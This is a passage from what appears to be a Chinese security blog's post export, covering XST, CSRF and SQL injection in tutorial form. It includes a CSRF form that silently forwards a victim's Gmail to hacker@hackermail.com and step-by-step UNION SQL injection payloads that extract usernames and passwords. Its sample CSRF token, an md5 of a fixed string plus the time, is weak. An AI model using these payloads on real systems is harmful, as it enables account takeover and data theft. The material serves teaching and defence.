text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7Cookie: &lt;script&gt;alert(&quot;TRACE XSS&quot;)&lt;/script&gt;\n发送请求后页面就会弹窗了。\n\n0x07 修复建议\nApache服务器：\n虚拟主机可以在.htaccess文件中添加如下代码过滤TRACE请求:RewriteEngine onRewriteCond %&#123;REQUEST_METHOD&#125; ^(TRACE|TRACK)RewriteRule .* - [F]服务器用户在httpd.conf尾部添加如下指令后，重启apache即可:TraceEnable off\nWeb 服务器限制 Trace、Track 方法的请求即可。\n另如今， XMLHTTPRequest 已经杜绝了 Trace 与 Track 方法的请求（Chrome 25 版本及 FireFox 19 之后），如果尝试用 Trace / Track 方法请求，会抛出 SecurityError 异常，这也从根本上杜绝了 XST 攻击。\nvar xhr = new XMLHttpRequest();xhr.open(&#x27;TRACE&#x27;, &#x27;http://localhost:3000/&#x27;, false);xhr.send(null);if(200 == xhr.status) console.log(xhr.responseText);\n\n0x08 其他补充：\n\nCST与XSS的比较:\n相同点：都具有很大的欺骗性，可以对受害主机产生危害，而且这种攻击是多平台多技术的，我们还可以利用Active控件、Flash、Java等来进行CST和XSS攻击。\nCST优点：可以绕过一般的http验证以及NTLM验证\n\n","categories":["常见攻击方法"]},{"title":"浅析CSRF漏洞","url":"/2023/08/06/%E6%B5%85%E6%9E%90CSRF%E6%BC%8F%E6%B4%9E/","content":"1、CSRF漏洞介绍\nCSRF(Cross-Site Request Forgery,跨站请求伪造)，也被称为 one-click attack 或者 session riding，通常缩写为 CSRF 或者 XSRF .它是一种常见的 Web攻击方式。是一种劫持用户在当前已登录的Web应用程序上执行非本意操作一种攻击.\n说的直白一点就是:别人盗用(劫持)你的身份去做坏事.（1）别人--&gt;这里指的是攻击者（2）你----&gt;A站(web服务器)上注册的合法用户(客户端)（3）做坏事---&gt;去请求合法站点A(比如web服务器)存在CSRF攻击的URL,实现类似发送恶意邮件/转账/创建账户/修改密码等&quot;你不希望执行&quot;操作.\n1.1 危害\n以用户的名义发邮件/发消息\n转换/购买商品等;\n修改密码;\n删除文章等\n2、CSRF漏洞的原理\n2.1 CSRF漏洞产生的原因\n(1)http协议使用session在服务端保存用户的个人信息,客户端浏览器用cookie标识用户身份;\n(2)cookie的认证只能确保是某个用户发送的请求,但是不能保证这个请求是否是&quot;用户自愿的行为&quot;.\n(3)这时,用户登录了某个web站点,同时点击了包含CSRF恶意代码的URL,就会触发CSRF\n2.2 漏洞利用的条件\n(1)用户必须登录A网站,生成了cookie\n(2)登录的同时访问了恶意URL(包含CSRF恶意代码的URL).\n\n2.3 CSRF和XSS的不同\n(1)XSS主要用户获取用户的cookie信息,达到控制客户端的目的\nXSS----&gt;把你的腰牌(用户身份象征也就是cookie)偷到手,黑客自己去搞破坏.\nCSRF主要是劫持用户身份,让客户端做一些不愿意做的事.\nCSRF----&gt;拿刀劫持你,&quot;借助你的身份&quot;来帮黑客做事.\n(2)危害上来说,XSS更大;\n(3)从应用难度上来说\nCSRF需要满足登录某网站的状态,同时访问了恶意的URL,应用条件比较苛刻.\nXSS只要一次点击或者存储到服务器即可.\n3、CSRF之GET型代码分析\nGET型CSRF代码举例\n\n\n问题：\n（1）但是URL直接写用户名和密码的方式太过于明显,我们可以通过访问页面的方式进行伪装;\n（2）或者通过XSS页面,直接把这个恶意URL链接发给客户端,在客户登录页面的同时访问这个恶意URL,也可以创建用户;\n（3）通过伪造页面诱导客户点击\n\n\n4、CSRF之POST型代码分析\n（1）有人说,GET方式容易出现CSRF攻击,那用post是不是就可以万无一失呢?\n（2）当然不是,因为post只是提交的方式改变了,如果原始页面还是存在CSRF漏洞,我们自己创建一个POST页面来模拟用户提交数据,还是可以进行利用的\n（3）post_csrf.php用来模拟存在csrf漏洞的web页面,代码如下：\n\n（4）页面显示如下：\n\npost型需要黑客自己来构造表单提交的参数\n为了不易发现,提交表单的数据都直接隐藏hidden;\npost.html代码如下:\n\n\n5、DVWA中CSRF利用实战\n5.1 挖掘CSRF的方法:\n(1)使用burp抓包后修改Referer字段再重新提交,如果能请求就存在CSRF漏洞.\n(2)其他CSRF工具,比如\nCSRFTester就是通过抓取提交参数;\n修改表单信息,重新提交;-----&gt;伪造客户端请求\n重新提交成功就存在CSRF漏洞.\nDVWA中low级别CSRF:没有对输入做过滤,而且也没有原密码认证\n6、csrf案例\n6.1 Gmail\n小明的悲惨遭遇\n这一天，小明同学百无聊赖地刷着Gmail邮件。大部分都是没营养的通知、验证码、聊天记录之类。但有一封邮件引起了小明的注意：\n甩卖比特币，一个只要998！！\n聪明的小明当然知道这种肯定是骗子，但还是抱着好奇的态度点了进去（请勿模仿）。果然，这只是一个什么都没有的空白页面，小明失望的关闭了页面。一切似乎什么都没有发生……\n在这平静的外表之下，黑客的攻击已然得手。小明的Gmail中，被偷偷设置了一个过滤规则，这个规则使得所有的邮件都会被自动转发到hacker@hackermail.com。小明还在继续刷着邮件，殊不知他的邮件正在一封封地，如脱缰的野马一般地，持续不断地向着黑客的邮箱转发而去。\n不久之后的一天，小明发现自己的域名已经被转让了。懵懂的小明以为是域名到期自己忘了续费，直到有一天，对方开出了 $650 的赎回价码，小明才开始觉得不太对劲。\n小明仔细查了下域名的转让，对方是拥有自己的验证码的，而域名的验证码只存在于自己的邮箱里面。小明回想起那天奇怪的链接，打开后重新查看了“空白页”的源码：\n&lt;form method=&quot;POST&quot; action=&quot;https://mail.google.com/mail/h/ewt1jmuj4ddv/?v=prf&quot; enctype=&quot;multipart/form-data&quot;&gt;     &lt;input type=&quot;hidden&quot; name=&quot;cf2_emc&quot; value=&quot;true&quot;/&gt;     &lt;input type=&quot;hidden&quot; name=&quot;cf2_email&quot; value=&quot;hacker@hakermail.com&quot;/&gt;     .....    &lt;input type=&quot;hidden&quot; name=&quot;irf&quot; value=&quot;on&quot;/&gt;     &lt;input type=&quot;hidden&quot; name=&quot;nvp_bu_cftb&quot; value=&quot;Create Filter&quot;/&gt; &lt;/form&gt; &lt;script&gt;     document.forms[0].submit();&lt;/script&gt;\n这个页面只要打开，就会向Gmail发送一个post请求。请求中，执行了“Create Filter”命令，将所有的邮件，转发到“hacker@hackermail.com”。\n小明由于刚刚就登陆了Gmail，所以这个请求发送时，携带着小明的登录凭证（Cookie），Gmail的后台接收到请求，验证了确实有小明的登录凭证，于是成功给小明配置了过滤器。\n黑客可以查看小明的所有邮件，包括邮件里的域名验证码等隐私信息。拿到验证码之后，黑客就可以要求域名服务商把域名重置给自己。\n小明很快打开Gmail，找到了那条过滤器，将其删除。然而，已经泄露的邮件，已经被转让的域名，再也无法挽回了……\n以上就是小明的悲惨遭遇。而“点开一个黑客的链接，所有邮件都被窃取”这种事情并不是杜撰的，此事件原型是2007年Gmail的CSRF漏洞\n7、CSRF漏洞防御\n修改密码时,需要原密码;对客户来讲,不要点击来历不明的链接或图片;养成定时退出的好习惯;安装安全防护软件等验证 Referer/Content-Type对于用户修改删除等操作最好都使用POST操作避免全站通用的Cookie，严格设置Cookie的域\nCSRF通常从第三方网站发起，被攻击的网站无法防止攻击发生，只能通过增强自己网站针对CSRF的防护能力来提升安全性。\n上文中讲了CSRF的两个特点：\n\nCSRF（通常）发生在第三方域名。\nCSRF攻击者不能获取到Cookie等信息，只是使用。\n\n针对这两点，我们可以专门制定防护策略，如下：\n\n阻止不明外域的访问\n\n同源检测\nSamesite Cookie\n\n\n提交时要求附加本域才能获取的信息\n\nCSRF Token\n双重Cookie验证\n\n\n\n以下我们对各种防护方法做详细说明。\n7.1 同源检测\n既然CSRF大多来自第三方网站，那么我们就直接禁止外域（或者不受信任的域名）对我们发起请求。\n那么问题来了，我们如何判断请求是否来自外域呢？\n在HTTP协议中，每一个异步请求都会携带两个Header，用于标记来源域名：\n\nOrigin Header\nReferer Header\n\n这两个Header在浏览器发起请求时，大多数情况会自动带上，并且不能由前端自定义内容。 服务器可以通过解析这两个Header中的域名，确定请求的来源域。\n使用Origin Header确定来源域名\n在部分与CSRF有关的请求中，请求的Header中会携带Origin字段。字段内包含请求的域名（不包含path及query）。\n如果Origin存在，那么直接使用Origin中的字段确认来源域名就可以。\n但是Origin在以下两种情况下并不存在：\n\nIE11同源策略： IE 11 不会在跨站CORS请求上添加Origin标头，Referer头将仍然是唯一的标识。最根本原因是因为IE 11对同源的定义和其他浏览器有不同，有两个主要的区别，可以参考MDN Same-origin_policy#IE_Exceptions\n302重定向： 在302重定向之后Origin不包含在重定向的请求中，因为Origin可能会被认为是其他来源的敏感信息。对于302重定向的情况来说都是定向到新的服务器上的URL，因此浏览器不想将Origin泄漏到新的服务器上。\n\n使用Referer Header确定来源域名\n根据HTTP协议，在HTTP头中有一个字段叫Referer，记录了该HTTP请求的来源地址。 对于Ajax请求，图片和script等资源请求，Referer为发起请求的页面地址。对于页面跳转，Referer为打开页面历史记录的前一个页面地址。因此我们使用Referer中链接的Origin部分可以得知请求的来源域名。\n这种方法并非万无一失，Referer的值是由浏览器提供的，虽然HTTP协议上有明确的要求，但是每个浏览器对于Referer的具体实现可能有差别，并不能保证浏览器自身没有安全漏洞。使用验证 Referer 值的方法，就是把安全性都依赖于第三方（即浏览器）来保障，从理论上来讲，这样并不是很安全。在部分情况下，攻击者可以隐藏，甚至修改自己请求的Referer。\n7.2 Token防御\nCSRF漏洞实质：服务器无法准确判断当前请求是否是合法用户的自定义操作\n漏洞修补逻辑分析:如果服务器在用户登录之后给予用户一个唯一合法令牌，每一次操作过程中，服务器都会验证令牌是否正确，如果正确那么执行操作，不正确不执行操作。\n一般情况下，给予的令牌写入表单隐藏域的value中，随着表单内容进行提交\nToken防御代码分析\n\n代码的意思是hello加上当前时间进行md5编码，当然hello可以改为其它复杂的字符串，这样不容易被破解出来，每一秒的值都会发生变化，如\n实例使用Token进行CSRF防御\n1.登陆验证成功之后，在会话SESSION[“user_token”]中保存Token\n2.在后台操作中，增删改表单中添加隐藏域hidden，设置value为Token\n3.提交之后验证Token是否正确\n附上代码\n&lt;?php    session_start();    function token_generate()    &#123;        $salt = &quot;hello&quot;.date(&quot;h:i:s&quot;);        $token = md5($salt);        return $token;    &#125;    $token = token_generate();    $_SESSION[&quot;user_token&quot;] = $token;?&gt;&lt;html&gt;    &lt;head&gt;        &lt;meta charset=&quot;utf-8&quot;&gt;        &lt;title&gt;CSRF_TOKEN&lt;/title&gt;    &lt;/head&gt;    &lt;body&gt;    &lt;h1&gt;CSRF_TOKEN&lt;/h1&gt;        &lt;form action=&quot;check.php&quot; method=&quot;post&quot;&gt;            &lt;input type=&quot;text&quot; value=&quot;111&quot;&gt;            &lt;input type=&quot;hidden&quot; name=&quot;user_token&quot; value=&quot;&lt;?php echo $token;?&gt;&quot;&gt;            &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;提交&quot;&gt;        &lt;/form&gt;    &lt;/body&gt;&lt;/html&gt;\n再附上check.php验证脚本代码\n&lt;?php    session_start();    $user_token = $_POST[&quot;user_token&quot;];    if($_SESSION[&quot;user_token&quot;] == $user_token)    &#123;        echo $_SESSION[&quot;user_token&quot;];        echo &quot;&lt;br&gt;&quot;;        echo &quot;$user_token&quot;;        echo &quot;&lt;br&gt;&quot;;        echo &quot;successful&quot;;    &#125;    else    &#123;        echo &quot;fail&quot;;    &#125;?&gt;\n为何token可以有效地防御：\ntoken 是被开发者发送给后端的，攻击者如果无法获取到token 是无法通过后端服务器的校验的但是cookie 不同，只要在同一个浏览器，浏览器就会自动将cookie 放入请求头中，如果用cookie 做登录验证，在同一个浏览器并且一登陆的情况下后端服务器将自动识别cookie 对请求进行放行例如：小明登录了csdn, 此时小明突然想到了一件事情，登录了另一个网站，而这个网站被不知名的人埋入了一些请求，这些请求是当其他人进入该网站，则请求csdn 友好的帮助访问者发布一篇文章，假如csdn 使用的是cookie做登录判断，小明访问该网站时触发了该请求，浏览器会自动将cookie 放入请求头中传给后端，后端服务器判断cookie 是已登录则放行了该网站的操作，小明在不知情的情况下被发布的一篇文章，这里只是一个例子，但是如果这里的请求变为自动将小明的钱包余额转账给那位不知名的人，就比较危险了而如果使用token,token 并不会自动被浏览器放入请求头，当其他攻击者像服务器发送请求时，是不会携带token 的，后端服务器没有获取到token 则不会对请求进行放行，保证了用户数据的安全性\nReferer防御CSRF原理：HTTP Referer是header的一部分，当浏览器向web服务器发送请求的时候，一般会带上Referer，告诉服务器我是从哪个页面链接过来的，服务器基于此可以获得一些信息用于处理\n当用户点击被构造好的CSRF利用页面，那么在执行用户对应操作时，提交的HTTP请求中就有对应的Referer值，此时服务端判断Referer值是否与服务器的域名信息有关，如果不关则不执行操作\nRefer防御代码编写\n在PHP中使用$_SERVER[‘HTTP_REFERER’]获取页面提交请求中的Referer值\n这里需要用到一个strpos函数，用法参考https://www.w3school.com.cn/php/func_string_strpos.asp\n附上防御代码：\n\nstrpos函数里面的意思也就是在获取的Referer值里面是否包含xx.com这个域名，如果包含了说明是正确的，没包含就可能是恶意的\n7.4 验证码防御CSRF\n验证码防御被认为是对抗CSRF最简单而且有效的防御方法，CSRF在用户不知情的情况下完成对应操作，而验证码强制用户与应用程序交互，才能最终完成操作，可以被认为是二次验证，但是出于对用户体验考虑，不可能每一次操作都加入验证码。所以验证码只是一种辅助手段，不能作为防御CSRF的主要解决方案\n理论上讲，在提交表单或者GET请求的地方，凡是没有用户进行二次验证或没有csrftoken(其他网站可能不叫csrftoken)的地方大概率存在csrf漏洞。\n7.5 双重Cookie验证\n在会话中存储CSRF Token比较繁琐，而且不能在通用的拦截上统一处理所有的接口。\n那么另一种防御措施是使用双重提交Cookie。利用CSRF攻击不能获取到用户Cookie的特点，我们可以要求Ajax和表单请求携带一个Cookie中的值。\n双重Cookie采用以下流程：\n\n在用户访问网站页面时，向请求域名注入一个Cookie，内容为随机字符串（例如csrfcookie=v8g9e4ksfhw）。\n在前端向后端发起请求时，取出Cookie，并添加到URL的参数中（接上例POST https://www.a.com/comment?csrfcookie=v8g9e4ksfhw）。\n后端接口验证Cookie中的字段与URL参数中的字段是否一致，不一致则拒绝。\n\n此方法相对于CSRF Token就简单了许多。可以直接通过前后端拦截的的方法自动化实现。后端校验也更加方便，只需进行请求中字段的对比，而不需要再进行查询和存储Token。\n当然，此方法并没有大规模应用，其在大型网站上的安全性还是没有CSRF Token高，原因我们举例进行说明。\n由于任何跨域都会导致前端无法获取Cookie中的字段（包括子域名之间），于是发生了如下情况：\n\n如果用户访问的网站为www.a.com，而后端的api域名为api.a.com。那么在www.a.com下，前端拿不到api.a.com的Cookie，也就无法完成双重Cookie认证。\n于是这个认证Cookie必须被种在a.com下，这样每个子域都可以访问。\n任何一个子域都可以修改a.com下的Cookie。\n某个子域名存在漏洞被XSS攻击（例如upload.a.com）。虽然这个子域下并没有什么值得窃取的信息。但攻击者修改了a.com下的Cookie。\n攻击者可以直接使用自己配置的Cookie，对XSS中招的用户再向www.a.com下，发起CSRF攻击。\n\n总结：\n用双重Cookie防御CSRF的优点：\n\n无需使用Session，适用面更广，易于实施。\nToken储存于客户端中，不会给服务器带来压力。\n相对于Token，实施成本更低，可以在前后端统一拦截校验，而不需要一个个接口和页面添加。\n\n缺点：\n\nCookie中增加了额外的字段。\n如果有其他漏洞（例如XSS），攻击者可以注入Cookie，那么该防御方式失效。\n难以做到子域名的隔离。\n为了确保Cookie传输安全，采用这种防御方式的最好确保用整站HTTPS的方式，如果还没切HTTPS的使用这种方式也会有风险。\n\n7.6 Samesite Cookie属性\n防止CSRF攻击的办法已经有上面的预防措施。为了从源头上解决这个问题，Google起草了一份草案来改进HTTP协议，那就是为Set-Cookie响应头新增Samesite属性，它用来标明这个 Cookie是个“同站 Cookie”，同站Cookie只能作为第一方Cookie，不能作为第三方Cookie，Samesite 有两个属性值，分别是 Strict 和 Lax，下面分别讲解：\nSamesite=Strict\n这种称为严格模式，表明这个 Cookie 在任何情况下都不可能作为第三方 Cookie，绝无例外。比如说 b.com 设置了如下 Cookie：\nSet-Cookie: foo=1; Samesite=StrictSet-Cookie: bar=2; Samesite=LaxSet-Cookie: baz=3\n我们在 a.com 下发起对 b.com 的任意请求，foo 这个 Cookie 都不会被包含在 Cookie 请求头中，但 bar 会。举个实际的例子就是，假如淘宝网站用来识别用户登录与否的 Cookie 被设置成了 Samesite=Strict，那么用户从百度搜索页面甚至天猫页面的链接点击进入淘宝后，淘宝都不会是登录状态，因为淘宝的服务器不会接受到那个 Cookie，其它网站发起的对淘宝的任意请求都不会带上那个 Cookie。\nSamesite=Lax\n这种称为宽松模式，比 Strict 放宽了点限制：假如这个请求是这种请求（改变了当前页面或者打开了新页面）且同时是个GET请求，则这个Cookie可以作为第三方Cookie。比如说 b.com设置了如下Cookie：\nSet-Cookie: foo=1; Samesite=StrictSet-Cookie: bar=2; Samesite=LaxSet-Cookie: baz=3\n当用户从 a.com 点击链接进入 b.com 时，foo 这个 Cookie 不会被包含在 Cookie 请求头中，但 bar 和 baz 会，也就是说用户在不同网站之间通过链接跳转是不受影响了。但假如这个请求是从 a.com 发起的对 b.com 的异步请求，或者页面跳转是通过表单的 post 提交触发的，则bar也不会发送。\n生成Token放到Cookie中并且设置Cookie的Samesite，Java代码如下：\nprivate void addTokenCookieAndHeader(HttpServletRequest httpRequest, HttpServletResponse httpResponse) &#123;       //生成token       String sToken = this.generateToken();       //手动添加Cookie实现支持“Samesite=strict”       //Cookie添加双重验证       String CookieSpec = String.format(&quot;%s=%s; Path=%s; HttpOnly; Samesite=Strict&quot;, this.determineCookieName(httpRequest), sToken, httpRequest.getRequestURI());       httpResponse.addHeader(&quot;Set-Cookie&quot;, CookieSpec);       httpResponse.setHeader(CSRF_TOKEN_NAME, token);   &#125;\n代码源自OWASP Cross-Site_Request_Forgery #Implementation example\n如何使用SamesiteCookie\n如果SamesiteCookie被设置为Strict，浏览器在任何跨域请求中都不会携带Cookie，新标签重新打开也不携带，所以说CSRF攻击基本没有机会。\n但是跳转子域名或者是新标签重新打开刚登陆的网站，之前的Cookie都不会存在。尤其是有登录的网站，那么我们新打开一个标签进入，或者跳转到子域名的网站，都需要重新登录。对于用户来讲，可能体验不会很好。\n如果SamesiteCookie被设置为Lax，那么其他网站通过页面跳转过来的时候可以使用Cookie，可以保障外域连接打开页面时用户的登录状态。但相应的，其安全性也比较低。\n另外一个问题是Samesite的兼容性不是很好，现阶段除了从新版Chrome和Firefox支持以外，Safari以及iOS Safari都还不支持，现阶段看来暂时还不能普及。\n而且，SamesiteCookie目前有一个致命的缺陷：不支持子域。例如，种在topic.a.com下的Cookie，并不能使用a.com下种植的SamesiteCookie。这就导致了当我们网站有多个子域名时，不能使用SamesiteCookie在主域名存储用户登录信息。每个子域名都需要用户重新登录一次。\n总之，SamesiteCookie是一个可能替代同源验证的方案，但目前还并不成熟，其应用场景有待观望。\n","categories":["常见top漏洞"]},{"title":"浅析sql注入","url":"/2023/08/06/%E6%B5%85%E6%9E%90sql%E6%B3%A8%E5%85%A5/","content":"SQL注入总结\nsql的注入可以分为数字类型，字符类型。\n方法1：\n首先我们可以使用(转义字符)来判断SQL注入的闭合方式。\n原理，当闭合字符遇到转义字符时，会被转义，那么没有闭合符的语句就不完整了，就会报错，通过报错信息我们就可以推断出闭合符。\n分析报错信息：看\\斜杠后面跟着的字符，是什么字符，它的闭合字符就是什么，若是没有，就为数字型。\n方法2：\n首先尝试：?id=1’?id=1”结果一：如果都报错判断闭合符为：整形闭合。&#x27;1&quot;&#x27;结果二：如果单引号报错，双引号不报错。继续尝试?id=1’ –-+结果1：无报错判断闭合符为：单引号闭合。结果2：报错判断闭合符可能为：单引号加括号。结果三：如果单引号不报错，双引号报错。继续尝试?id=1&quot; -–+结果1：结果无报错判断闭合符为：双引号闭合。结果2：报错判断闭合符可能为：双引号加括号。注意：这里的括号不一定只有一个，闭合符里是允许多个括号组合成闭合符的，具体要判断有多少个括号，可以使用二分法来快速判断。\n判断是否存在注入点通过\\ 或者 and1=1 and 1=2  and sleep(3) 查看页面状态  之类的凭感觉是否有注入，有的话判断闭合方式判断闭合方式常规闭合&#x27; &#x27;) &#x27;)) &quot; &quot;) &quot;))   奇葩闭合方式    一个)   和两个 ))通过and 1=1  和and 1=2 来判断是否执行了我们输入的语句靶场经验（我会经常通过 &#x27; and sleep(3) --+ 延时判断来闭合，个人习惯，然后一步一步找闭合方式，只要能闭合成功，其它都好说）\n0x01 什么是SQLI\n所谓SQL注入就是用户在能够控制SQL查询、更新、插入、删除等语句的参数的情况下，攻击者通过构造特殊的输入字符串使后端程序错误地识别SQL查询语句中的代码与数据部分从而导致数据库管理系统输出了非预期的结果的一种行为。\nSQL注入本质上来讲就是拼接字符串，通过输入额外的信息破坏外后端脚本原有的查询语句结构，从而达成注入的目的。\n攻击者构造的查询参数在SQL语句中没有被当作一个字符串对待，而是具有了实际的功能特性，这是PHP的语法决定的，它只是简单地将用户的输入与后端预定义的语句做了一个拼接，将拼接的结果整体作为一条SQL的查询语句。正是这个特性导致了SQL注入的产生.\n0x02 sql注入的产生\n注: web程序结构\n三层架构(3-tier architecture) 通常意义上就是将整个业务应用划分为：\n\n界面层（User Interface layer）\n业务逻辑层（Business Logic Layer）\n数据访问层（Data access layer）\n\n\n用户能够直接使用的都是在表示层，在表示层输入自己要访问的内容，输入的内容传递到业务逻辑层进行处理，并将处理后的数据写入到数据库中。\n同理需要请求的内容从数据库中查询出来后在业务逻辑层进行业务逻辑处理，之后呈现在表示层。\n以上两步就是一个正常的请求和响应过程。\nsql注入就是因为业务逻辑层没有做安全过滤，到时了从表示层传递过来的数据修改了正常的sql语句结构，从而达到了黑客自身的攻击目的。\n2.1 字符型注入\n当我们传入的参数在后端代码中被引号引起来的时候，我们称这种情况为字符型注入\n看下面的例子（字符型注入）\n$query=&quot;select name,age,gender from t_students where id=&#x27;&#123;$_GET[&#x27;id&#x27;]&#125;&#x27;&quot;;\n字符型注入最关键的是如何闭合SQL语句以及注释多余的代码。\n注：数据库不同，字符串连接符不同， SQL server的连接符为“+”，Oracle连接符为“||”，MySQL连接符为空格\n2.2 数字型注入\n我们传入的参数在后端代码中没有被引起来的时候，我们称这种情况为数字型注入。当然之后参数类型为数字的时候，才存在区分数字型和字符型的情况\n$query=&quot;select name,age,gender from t_students where id=&#123;$_GET[&#x27;id&#x27;]&#125;&quot;;\n此时我们传入的参数直接与id进行比较\n进行sql注入的首要操作就是对注入类型进行判断，即对sql语句的闭合方式进行判断\n0x03 按照请求方法分\n3.1 GET型注入\n所谓GET型注入，顾名思义，即注入点的参数是同通过GET请求发送到后端进行处理的。其又可以分为下面两种情形：\n3.2 POST型注入\n同理POST是不同于GET的另一种传参方式，大多出现在各种框处，比如登录框，查询框，和各种与数据库有交互的框。post注入和get注入基本没有本质的区别，除了在宽字节注入方面的操作有所区别，基本操作一致。\n3.3 url注入\n即注入点在url中。举个例子，现在有一个网页，实现了根据学生学号，来查询学生基本信息的功能，学生的id信息是通过GET方法传参发送到后端的，其请求的url如下\nhttp://www.armandhe.com/query.php?id=20140379\n后台处理代码如下\n$query=&quot;select name,age,gender from t_students where id=&#123;$_GET[&#x27;id&#x27;]&#125;&quot;;\n在该例中，我们通过修改url中的id参数的值，来控制前端页面的显示结果。因为没有过滤的原因，我们输入的任何参数值都将被直接拼接到SQL查询语句中，那么我们就可以通过联合查询注入的方式进行注入。\n3.4 请求头注入\n简单理解就是注入点在请求头中。还是上面的例子，不过url中的参数被后端进行了严格的过滤，不存在任何的注入方法，但后端在进行处理的时候不仅仅是使用了查询语句，还对我们请求头中的user-agent字段在数据库中进行了查询，来防止恶意爬虫，但憨憨程序员却没有对用户的请求头做过滤。于是乎我们可以在请求头中构造恶意代码。同理，不只是user-agent字段，其他字段包括referer等，都可以进行注入，后端处理逻辑如下\n$link = @mysqli_connect($host,$username,$password,$dbname,$port);$userAgent=getallheaders()[&#x27;User-Agent&#x27;];$query=&quot;select * from AgentJudge where userAgent=&#x27;&#123;$userAgent&#125;&#x27;&quot;;$result=mysqli_query($link,$query);if (mysqli_num_rows($result)!=0)&#123;    print(&#x27;请不要恶意浏览本网页&#x27;);&#125;\n可以看到后端代码中并没有对user-agent字段做过滤，那么我们就可以直接开始构造注入语句\n0x04 按照有无回显分\n4.1 注入步骤\n判断注入点是否存在\n首先我们需要判断注入点是否存在，如果在页面的url中存在某些参数，比如下面这个URL中就存在一个id参数：http://xxxxx.xxx/?id=1\n我们就可以尝试改变id的数值，将参数值+1或-1，然后查看页面展示的内容是否会变化，如果页面会发生变化，则我们就可以初步判断，这个id会带入数据库查询，查询后的内容会显示到页面中来。\n猜测查询的SQL语句大致为：\nselect * from [表名] where id = 1;\n常见注入点:\n1.GET/POST/PUT/DELETE参数2.X-Forwarded-For3.文件名\n接下来我们就可以进行测试，看看我们传入的参数是否会被带入数据库查询，测试的方法如下：(这里也称为sql脱库即拿出数据库里面的数据)\n添加单引号添加了单引号之后，如果页面中直接进行了报错，并且报错的信息显示到了页面中来，说明我们输入的单引号被带入了数据库查询，我们就可以直接判断此处存在sql注入漏洞。并且结合之前判断的页面是否有回显，就可以尝试进行联合查询注入或是报错注入。添加逻辑运算添加[and 1 = 1]和[and 1 = 2]在添加逻辑运算之前我们需要判断或者猜测注入点的数据类型和闭合方式，并对语句进行相应的引号、括号闭合。比如字符型我们可以直接添加and 1=1 ，而单验号闭合的字符型我们就需要添加 &#x27;and &#x27;1&#x27;=1 ，或 &#x27;and &#x27;1&#x27;=1&#x27; # 使用注释符号将后面的引号直接注释掉。添加了逻辑运算符之后提交，因为1=1恒为真，而1=2恒为假，所以如果我们的输入带入了数据库，一定会影响到SQL语句的布尔状态，如果两次查询返回的页面不同，说明页面存在布尔状态，此处存在注入漏洞，可以考虑使用布尔盲注进行注入。添加sleep( )函数sleep()函数可以让程序在当前位置停留指定的时间，于是我们可以通过观察页面相应的时间来判断我们插入的参数是否会被带入数据库执行。在参数后添加 and sleep(5) 然后观察页面响应时间是否明显变长，或直接在开发者工具中网络选项卡下观察页面的响应时间。如果页面响应时间确实按照我们的要求增加了5秒，则说明此处存在注入漏洞，我们可以考虑通过延时注入。\n​\t\t在这里我们需要知道，我们构建union select语句时，当前面的查询语句为假，也就是数据不存在时，union select之后查询出的结果就会显示在页面中。这里我们可以通过在前面查询语句中添加 and 1=2 使语句变假，也可以直接将id传入一个负数，来使语句变假。\nSTEP1：判断闭合符\nSTEP2：判断列数\n联合查询会将两条查询语句的查询结果拼接到一起返回！于是反映出联合查询需遵守的一个规则便是，两条查询语句的查询字段数必须相等，于是乎在利用联合查询进行注入的时候，我们第一步要做的就是判断判断后端代码中的SQL查询语句的字段数。\nselect id,username,passwd from t_user order by 4;\norder by +数字     通过页面状态查看有几列然后通过union select 判断回显位（注意判断回显位的时候，前面查询的值要为假，不然回显位会被前面查询的结果所占用，导致看不到回显位）靶场经验（如果order by被过滤了，可以通过 group by 来判断，或者 union select 1,2,3,4,5,6, 这两的列数查询判断网页状态）\nSTEP 3：查数据库名\n注意：（union  和union all 的区别   union all 显示重复的值，而union不显示重复的值，当union select 用不了的时候可以通过union all 来查询）\n?id=-1 union select 1,database(),1--+\n​     注意id=-1,此处id的值必须是一个在数据库中id字段不存在的值，否则联合查询第一条语句的查询结果将占据显示位，我们需要的第二条查询语句的查询结果就不能正常显示到浏览器中。\nSTEP 4：查表名\n​      假如上一步查询出来的数据库名为security\n?id=-1&#x27; union select 1,group_concat(table_name),1 from information_schema.tables where table_schem=&#x27;security&#x27;--+\n注意第二条查询语句我们payload插入位置的字段一定要在前端有回显，否则我们将不能查看到查询结果。\nSTEP 5：查列名\n假如上一步查询出来的表名中有user表\n?id=-1&#x27; union select 1,group_concat(column_name),1 from information_schema.columns where table_schema=database() and table_name=&#x27;user&#x27;--+\nSTEP 6：查数据\n假如上一步查询出来的字段有username与password\n?id=-1&#x27; and select 1,group_concat(concat(0x7e,username,0x7e,passwd,0x7e)),1 from user--+\n4.2 有回显\n4.2.1 联合查询注入\ninformation_schema库简介   information_schema库是mySQL自带的一个库，其中包含了当前数据库管理系统的所有信息，但该数据库并不是一个实体的数据库，它不存储任何实际意义上的数据，它只是整个数据库管理系统的一个视图，当某个数据库的某个表发生变化时，information_schema库中相关的数据将同时发生变化。    在注入中，我们关注的是该库中的schemata、tables、columns三个表。他们分别存储了整个数据库管理系统的所有数据库信息，表信息，字段信息。在schemata表中，通过schema_name字段可以获取所有的数据库名；在tables,通过table_name、table_schema字段可以获取所有的表名与其对应的数据库名；在columns表中，通过columns、table_name、table_schema字段可以获取所有的字段名以及其所属表与数据库。   我们的注入思路就是先通过mysql的内建函数database(),获取当前数据库名，再通过tables表获取，所有的表信息，再通过columns表获取上述表所有的字段，最后通过字段查询想要的数据。当然使用information_schema库查询信息有一个很重要的条件限制，那就是，需要当前连接数据库的用户具有读该数据库的权限，\n应用场景\nUNION连续的几个查询的字段数一样且列的数据类型转换相同，就可以查询数据；注入点有回显；只有最后一个SELECT子句允许有ORDER BY；只有最后一个SELECT子句允许有LIMIT。UNION注入的流程graph LRA[order by确定列数] --&gt; B[&quot;查看返回点,选取可以显示数据的位置&quot;]B --&gt; C[&quot;读库、读表、读数据(可执行任意语句)&quot;]注意:为什么 order by 能确定列数？order by 的作用为根据一列或者多列的值，按照升序或者降序排列数据，当超出表的列数时发生报错。为什么需要确定列数？UNION 内部的 SELECT 语句必须拥有相同的列（可用二分快速查找）\n4.2.2 盲注\n盲注又分为布尔盲注与时间盲注两种类型\n布尔盲注\n基本原理是：通过控制通过and连接起来的子句的布尔值，来控制页面的显示结果来判断and后子句的真实性,bool盲注适用于bool判断的结果能够回显在界面内容中的情况，例如界面文本的变化。举个例子\n?id=1&#x27; 